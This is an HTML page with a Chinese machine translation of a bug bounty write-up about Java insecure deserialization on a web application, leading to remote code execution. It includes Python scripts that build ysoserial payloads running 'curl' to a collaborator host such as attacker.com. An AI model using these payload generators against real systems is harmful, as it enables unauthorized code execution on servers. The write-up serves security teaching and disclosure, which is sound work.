<html>
<head>
<title>The Story of an RCE on a Java Web Application</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Java Web应用程序上的RCE的故事</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/the-story-of-a-rce-on-a-java-web-application-2e400cddcd1e?source=collection_archive---------0-----------------------#2022-01-27">https://infosecwriteups.com/the-story-of-a-rce-on-a-java-web-application-2e400cddcd1e?source=collection_archive---------0-----------------------#2022-01-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d9f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大约两个月前(2021年11月)，我受邀参加了一个私人项目。根据他们的程序范围，我决定黑他们一段时间。这篇文章是关于我在这家公司发现的一个导致RCE的漏洞。</p><h1 id="b6fb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">侦察</h1><p id="8a14" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">在这一步，我的侦查方法没有发现一些独特的子域或资产。我在搜索一些具有一些有趣功能的网络应用程序，比如登录或文件上传。过了一会儿，我发现了一个有趣的入口。</p><p id="90f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在接下来的内容中，为了学习它的功能，我不得不重新定位门户本身。作为一个正常的套路，我尝试以一个正常用户的身份使用web应用(如果你不了解应用的正常流程，你是无法破解的)。我写下重要的事情，然后打开打嗝。</p><h1 id="3667" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">发现</h1><p id="3a26" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我被门户吸引是因为它是定制的，这种门户、CMSes或论坛通常比公共版本(如WordPress)更容易受到攻击。在Burp中捕获请求时，我一直在测试各个部分，直到到达一个包含列表的页面，当我滚动该页面时，Java Script发送了一个Ajax请求来加载更多的行。请求是这样的:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="4bb3" class="lx km iq lt b gy ly lz l ma mb"><a class="ae mc" href="https://target.com/api/v1/list?size=25&amp;after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==" rel="noopener ugc nofollow" target="_blank">https://target.com/api/v1/list?size=25&amp;after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==</a></span></pre><figure class="lo lp lq lr gt me gh gi paragraph-image"><div class="gh gi md"><img src="../Images/bbaf0bdd039ae2f4cb0a68c7745e9e4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*ZDG98-AuZZ1WHCs0ht9VTQ.png"/></div></figure><p id="dbaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试的第一件事是解码<code class="fe mh mi mj lt b">after</code>参数值(如你所知，是base64)。它有一个二进制值，但一些字符解码成功:</p><figure class="lo lp lq lr gt me gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/9691e9e6df090e96476b02a3c7a224cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lXp9sJB2TN4dbW-AXxAdJA.png"/></div></div></figure><p id="5eea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你所看到的，<code class="fe mh mi mj lt b">java</code>被解码了，我猜是一个序列化的值(通过一些研究，我很确定，因为它是以<code class="fe mh mi mj lt b">rO0</code>开始的)。</p><h1 id="79b8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反序列化</h1><p id="4607" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">如您所知，序列化是将<a class="ae mc" href="https://en.wikipedia.org/wiki/Data_structure" rel="noopener ugc nofollow" target="_blank"> </a>数据结构或<a class="ae mc" href="https://en.wikipedia.org/wiki/Object_(computer_science)" rel="noopener ugc nofollow" target="_blank"> </a>对象状态转换为可存储(例如，在文件中)或可通过网络传输的格式的过程。相反的操作，从一系列字节中提取一个数据结构，就是<strong class="jp ir">反序列化</strong> ( <a class="ae mc" href="https://en.wikipedia.org/wiki/Serialization" rel="noopener ugc nofollow" target="_blank">维基百科</a>)。</p><p id="b0fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一些程序使用序列化来存储状态，然后使用反序列化来恢复状态(就像我们测试的web应用程序一样)。但是如果程序反序列化一个不安全的输入会发生什么呢？这里是<strong class="jp ir">不安全反序列化</strong>发挥作用的地方。在这个漏洞中(也在OWASP A8:2021中)，攻击者发送他们的恶意序列化值作为易受攻击程序的输入。这通常会导致特权升级和RCE。不安全的反序列化在各种编程语言中都有发生，但我主要关注Java。</p><figure class="lo lp lq lr gt me gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/b4ea25ad08e3d9b714461b649c2106a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*pwMbKl8czO8lGyLut1HDZQ.png"/></div><figcaption class="mq mr gj gh gi ms mt bd b be z dk translated">geeksforgeeks.com</figcaption></figure><h1 id="1597" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">漏洞</h1><p id="9456" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我之前提到过，在对序列化值进行解码之后，我开始研究Java中的反序列化(虽然我对白盒的东西从来不感兴趣，但是我也研究了Java中的序列化函数:)。作为研究的结果，我了解到我们可以以不同的格式给出序列化的输入，例如:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="41fb" class="lx km iq lt b gy ly lz l ma mb">Hex signature      -&gt;   AC ED 00 05</span><span id="0a29" class="lx km iq lt b gy mu lz l ma mb">Base64 signature   -&gt;   rO0</span></pre><p id="627c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目标使用base64，因此我们必须找到一种方法来为RCE创建恶意的序列化输入，但在此之前，我们应该确保目标是易受攻击的。这里我有两种方法:1。用Java写一个PoC代码(我当时不懂Java ) 2。公开使用可用的PoC代码。我很确定第二种方式对我来说更好(尽管我不想成为一个脚本小子)。于是我开始在GitHub里搜索一些PoC代码，找到了<a class="ae mc" href="https://github.com/frohoff/ysoserial" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> ysoserial </strong> </a>。该工具根据功能或版本生成各种有效载荷，其中一个有效载荷是<em class="mv"> URLDNS </em>，你可以给它一个URL，它就会生成一个有效载荷。如果我们给出生成的有效载荷并从服务器获得DNS查询，程序就容易受到攻击。换句话说，我必须进行带外测试，以确保应用程序易受攻击。我生成了有效载荷，并把它交给了web应用程序；</p><figure class="lo lp lq lr gt me gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mw"><img src="../Images/f45cd05b725e8175ef32c968488970be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N03ECDyckJFj7MKA_1DPPw.png"/></div></div></figure><p id="d3c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我收到一些DNS查询，目标很脆弱。让我们利用它。</p><h1 id="eae4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">剥削</h1><p id="edf2" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我确信我可以利用它，但有一个问题。我又用了ysoserial但是我很震惊，因为它不起作用(至少我没有找到任何合适的有效载荷)。我放弃了，开始在门户上寻找其他bug。</p><p id="240f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2-3周后，我决定再做一次。像以前一样，我不得不想办法:1。用Java 2为RCE编写一个漏洞利用代码。在GitHub(或任何地方)寻找漏洞代码。我选择了第二种方式(通常会有漏洞代码)。这一次，我发现了一些带有一些额外负载/选项的ysoserial forks。我无法手动测试这些有效载荷(它们太多了)。因此，我编写了一个python脚本来生成所有可能的有效载荷，并将它们保存在一个文件中。然后我把那个文件给了打饱嗝的入侵者，但还是没用。该脚本的最终版本是这样的:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="3bc3" class="lx km iq lt b gy ly lz l ma mb">import os<br/><br/>modes = [] # All payload names here<br/><br/>collab = "attacker.com"<br/>payload = f"curl -s https://rce.{collab}/poc"<br/><br/>for i in range(0,6):<br/><br/>    for mode in modes:<br/>            result = os.popen('java -jar ysoserial' + f"{i}" + '.jar ' + mode + ' "' + payload + '" | base64 -w 0').read()<br/><br/>    if result != "":<br/>            print(result)<br/>    else:<br/>            print("Donno but something is going wrong :/")</span></pre><h1 id="68a7" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">第二次尝试</h1><p id="e71a" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">当我没有收到目标的任何请求时，我有点放弃了，但是我看了看回应。一些状态代码是400，或者其他一些响应包含Java错误。通过一些故障排除，我注意到base64中的一些字符破坏了请求(例如<code class="fe mh mi mj lt b">+</code>)。所以我必须在保存之前修改我的python脚本和URL编码。第二次，我把新单词表给了打嗝的入侵者，几秒钟后:</p><figure class="lo lp lq lr gt me gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/4bbc44afb753dd262e805c8c37014c5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:966/format:webp/1*83_h0QyU7pUkRVZbpQws5Q.png"/></div></figure><p id="df01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我能够在服务器(RCE)上执行我的命令。在找到正确的有效负载和正确的ysoserial分支后，我用Python编写了一个漏洞利用代码，以便于复制:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="8522" class="lx km iq lt b gy ly lz l ma mb">import os<br/>import urllib.parse<br/><br/>mode = "THAT_FOUNDED_SUITABLE_MODE"<br/><br/>collab = input("Enter your collaborator domain (e.g. attacker.com)&gt; ")<br/>payload = f"curl -s https://{collab}/poc"<br/><br/>result = os.popen('java -jar ysoserial4.jar ' + mode + ' "' + payload + '" | base64 -w0').read()<br/><br/>encoded = urllib.parse.quote_plus(result)<br/><br/>if encoded != "":<br/>    print("Copy the following payload:\n\n")<br/>    print(encoded)<br/>else:<br/>    print("Donno but something is going wrong :/")</span></pre><p id="5204" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后我创建了<code class="fe mh mi mj lt b">/tmp/poc.txt</code>并报告了漏洞。对于PoC，这就足够了。</p><h1 id="7909" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">经验教训</h1><ul class=""><li id="7630" class="my mz iq jp b jq lj ju lk jy na kc nb kg nc kk nd ne nf ng bi translated">总是解码任何base64或其他编码文本。</li><li id="ac68" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">公共工具是好的，但是如果我用Java编写自己的漏洞利用代码，我会更快地发现这个漏洞。</li><li id="5391" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">总是测试每个功能，有时，你必须滚动页面:)</li><li id="c1ec" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">有时候，我们也不得不做那些无聊的工作。</li><li id="2132" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">默认情况下，Burp入侵者对给定的有效载荷进行编码。但是这个特性在我的打嗝中被关闭了，虽然我在Python脚本中解决了这个问题，但是我发现这个特性是一个更好的解决方案。</li></ul><h1 id="299b" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">资源</h1><ul class=""><li id="6e30" class="my mz iq jp b jq lj ju lk jy na kc nb kg nc kk nd ne nf ng bi translated"><a class="ae mc" href="https://www.geeksforgeeks.org/serialization-in-java/" rel="noopener ugc nofollow" target="_blank">https://www.geeksforgeeks.org/serialization-in-java/</a></li><li id="0fb4" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><a class="ae mc" href="https://github.com/frohoff/ysoserial" rel="noopener ugc nofollow" target="_blank">https://github.com/frohoff/ysoserial</a></li><li id="de4c" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><a class="ae mc" href="https://www.baeldung.com/java-serialization" rel="noopener ugc nofollow" target="_blank">https://www.baeldung.com/java-serialization</a></li><li id="4598" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><a class="ae mc" href="https://www.javatpoint.com/serialization-in-java" rel="noopener ugc nofollow" target="_blank">https://www.javatpoint.com/serialization-in-java</a></li><li id="2312" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><a class="ae mc" href="https://www.tutorialspoint.com/java/java_serialization.htm" rel="noopener ugc nofollow" target="_blank">https://www.tutorialspoint.com/java/java_serialization.htm</a></li></ul></div><div class="ab cl nm nn hu no" role="separator"><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr"/></div><div class="ij ik il im in"><h1 id="8817" class="kl km iq bd kn ko nt kq kr ks nu ku kv kw nv ky kz la nw lc ld le nx lg lh li bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae mc" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="ny nz gp gr oa ob"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="oc ab fo"><div class="od ab oe cl cj of"><h2 class="bd ir gy z fp og fr fs oh fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oi l"><h3 class="bd b gy z fp og fr fs oh fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="oj l"><p class="bd b dl z fp og fr fs oh fu fw dk translated">iwcon.live</p></div></div><div class="ok l"><div class="ol l om on oo ok op mf ob"/></div></div></a></div></div></div>    
</body>
</html>